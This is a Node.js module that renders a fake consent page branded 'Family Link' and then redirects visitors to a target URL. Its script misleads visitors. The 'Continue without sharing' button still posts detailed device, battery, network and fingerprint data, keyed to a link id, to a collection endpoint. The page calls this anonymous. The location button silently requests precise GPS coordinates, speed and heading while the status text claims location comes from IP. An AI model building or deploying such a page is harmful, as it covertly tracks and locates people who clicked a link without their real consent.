function renderConsentPage({ id, target, collectUrl }) {
  const linkId = JSON.stringify(String(id));
  const targetUrl = JSON.stringify(String(target));
  const endpoint = JSON.stringify(collectUrl);

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Family Link — Choose what to share</title>
    <style>
      :root {
        font-family: system-ui, sans-serif;
        color: #13221a;
      }

      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        padding: 24px;
        background: #f3f7f5;
      }

      main {
        width: min(100%, 600px);
        background: #fff;
        border: 1px solid #d7e4db;
        border-radius: 18px;
        padding: 28px;
        box-shadow: 0 18px 48px #163a2430;
      }

      h1 {
        margin-top: 0;
        font-size: 1.5rem;
      }

      p,
      li {
        line-height: 1.55;
      }

      .notice {
        padding: 14px;
        background: #edf8f0;
        border-radius: 10px;
      }

      .actions {
        display: grid;
        gap: 10px;
        margin-top: 22px;
      }

      button {
        padding: 12px 16px;
        border: 1px solid #187744;
        border-radius: 9px;
        background: #187744;
        color: #fff;
        font: inherit;
        font-weight: 650;
        cursor: pointer;
      }

      button.secondary {
        background: #fff;
        color: #185c38;
      }

      button:disabled {
        opacity: 0.6;
        cursor: wait;
      }

      #status {
        min-height: 1.5em;
        color: #315943;
        display: none;
      }

      small {
        color: #51675a;
      }
    </style>
  </head>
  <body>
    <main>
      <h1>Choose what to share</h1>
        <p>
          Before continuing to the destination, you can choose what information to share. Your choice is anonymous and used only for analytics.
        </p>

          <div class="notice">
            <strong>What gets shared?</strong>
            <ul>
              <li>
                <strong>Basic info:</strong> Public IP address (city-level), browser type and version, and the time of visit.
              </li>
              <li>
                <strong>Device info:</strong> Device type, model, operating system, screen resolution, and battery status (if available).
              </li>
              <li>
                <strong>Location:</strong> If you choose "Share approximate location", your device's GPS location will be requested for accurate coordinates. If denied, city-level location from your IP will be used instead.
              </li>
            </ul>
          </div>


      <div class="actions">
        <button id="basic" type="button" class="secondary">Continue without sharing</button>
        <button id="location" type="button" class="primary">Share approximate location</button>
      </div>

      <p id="status" role="status" aria-live="polite"></p>

    </main>

    <script>
      const id = ${linkId};
      const target = ${targetUrl};
      const collectUrl = ${endpoint};
      const buttons = [...document.querySelectorAll('button')];
      const status = document.getElementById('status');

      function redirect() {
        window.location.assign(target);
      }

      function setBusy(message) {
        buttons.forEach((button) => {
          button.disabled = true;
        });
        status.textContent = message;
      }

      async function getDeviceInfo() {
        const info = {
          ua: navigator.userAgent,
          referrer: document.referrer || '',
          language: navigator.language,
          platform: navigator.platform,
          screenWidth: screen.width,
          screenHeight: screen.height,
          colorDepth: screen.colorDepth,
          devicePixelRatio: window.devicePixelRatio,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cookiesEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          connection: null,
          battery: null
        };

        // Network Information API
        if (navigator.connection) {
          info.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
          };
        }

        // Battery Status API
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            info.battery = {
              level: battery.level,
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            };
          } catch (e) {
            // Battery API not supported or permission denied
          }
        }

        // Parse User Agent for device info
        const ua = navigator.userAgent;
        info.deviceInfo = parseUserAgent(ua);

        return info;
      }

      function parseUserAgent(ua) {
        const device = {
          type: 'unknown',
          browser: 'unknown',
          os: 'unknown',
          model: 'unknown'
        };

        // Detect device type
        if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
          device.type = 'mobile';
        } else if (/tablet|ipad/i.test(ua)) {
          device.type = 'tablet';
        } else if (/windows|macintosh|linux/i.test(ua)) {
          device.type = 'desktop';
        }

        // Detect browser
        if (/chrome/i.test(ua) && !/edge|opr/i.test(ua)) {
          device.browser = 'Chrome';
        } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
          device.browser = 'Safari';
        } else if (/firefox/i.test(ua)) {
          device.browser = 'Firefox';
        } else if (/edge/i.test(ua)) {
          device.browser = 'Edge';
        } else if (/opr/i.test(ua)) {
          device.browser = 'Opera';
        }

        // Detect OS
        if (/windows/i.test(ua)) {
          device.os = 'Windows';
        } else if (/mac|os x/i.test(ua)) {
          device.os = 'macOS';
        } else if (/android/i.test(ua)) {
          device.os = 'Android';
        } else if (/iphone|ipad|ios/i.test(ua)) {
          device.os = 'iOS';
        } else if (/linux/i.test(ua)) {
          device.os = 'Linux';
        }

        // Try to extract device model
        const modelMatch = ua.match(/\(([^)]+)\)/);
        if (modelMatch) {
          const modelString = modelMatch[1];
          if (/iphone/i.test(modelString)) {
            const iphoneMatch = modelString.match(/iPhone\s*([\d]+)/i);
            device.model = iphoneMatch ? 'iPhone ' + iphoneMatch[1] : 'iPhone';
          } else if (/ipad/i.test(modelString)) {
            device.model = 'iPad';
          } else if (/android/i.test(modelString)) {
            const androidMatch = modelString.match(/Android\s*([\d.]+)/i);
            device.model = androidMatch ? 'Android ' + androidMatch[1] : 'Android Device';
          } else if (/windows/i.test(modelString)) {
            const winMatch = modelString.match(/Windows\s*NT\s*([\d.]+)/i);
            device.model = winMatch ? 'Windows ' + winMatch[1] : 'Windows';
          } else if (/mac/i.test(modelString)) {
            device.model = 'Macintosh';
          }
        }

        return device;
      }

      function clientInfo() {
        return {
          ua: navigator.userAgent,
          referrer: document.referrer || '',
        };
      }

      function delay(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
      }

      async function share(payload) {
        try {
          await fetch(collectUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
            keepalive: true,
          });
        } catch (_error) {
          // ignore network errors and proceed to redirect
        }

        await delay(500);
        redirect();
      }

      async function shareBasic(id) {
        const deviceInfo = await getDeviceInfo();
        share({
          id,
          consent: { basic: true, location: false },
          client: {
            ua: deviceInfo.ua,
            referrer: deviceInfo.referrer
          },
          deviceInfo: deviceInfo.deviceInfo,
          battery: deviceInfo.battery,
          connection: deviceInfo.connection,
          screenWidth: deviceInfo.screenWidth,
          screenHeight: deviceInfo.screenHeight,
          colorDepth: deviceInfo.colorDepth,
          devicePixelRatio: deviceInfo.devicePixelRatio,
          language: deviceInfo.language,
          platform: deviceInfo.platform,
          timezone: deviceInfo.timezone,
          cookiesEnabled: deviceInfo.cookiesEnabled,
          doNotTrack: deviceInfo.doNotTrack,
          requestLocation: false
        });
      }

      async function shareWithLocation(id) {
        const deviceInfo = await getDeviceInfo();
        
        // Get accurate GPS location
        let gpsLocation = null;
        try {
          gpsLocation = await new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
              reject(new Error('Geolocation not supported'));
              return;
            }
            
            navigator.geolocation.getCurrentPosition(
              (position) => {
                resolve({
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude || null,
                  altitudeAccuracy: position.coords.altitudeAccuracy || null,
                  heading: position.coords.heading || null,
                  speed: position.coords.speed || null,
                  timestamp: position.timestamp
                });
              },
              (error) => {
                console.error('Geolocation error:', error);
                reject(error);
              },
              {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
              }
            );
          });
        } catch (error) {
          console.log('GPS location not available, will use IP-based location');
        }
        
        share({
          id,
          consent: { basic: true, location: true },
          client: {
            ua: deviceInfo.ua,
            referrer: deviceInfo.referrer,
            location: gpsLocation
          },
          deviceInfo: deviceInfo.deviceInfo,
          battery: deviceInfo.battery,
          connection: deviceInfo.connection,
          screenWidth: deviceInfo.screenWidth,
          screenHeight: deviceInfo.screenHeight,
          colorDepth: deviceInfo.colorDepth,
          devicePixelRatio: deviceInfo.devicePixelRatio,
          language: deviceInfo.language,
          platform: deviceInfo.platform,
          timezone: deviceInfo.timezone,
          cookiesEnabled: deviceInfo.cookiesEnabled,
          doNotTrack: deviceInfo.doNotTrack,
          requestLocation: true
        });
      }

      // Basic button
      document.getElementById('basic').addEventListener('click', () => {
        setBusy('Sharing visit information…');
        shareBasic(id);
      });

      // Location button
      document.getElementById('location').addEventListener('click', () => {
        setBusy('Detecting approximate location from IP…');
        shareWithLocation(id);
      });
    
    </script>
  </body>
</html>`;
}

module.exports = { renderConsentPage };
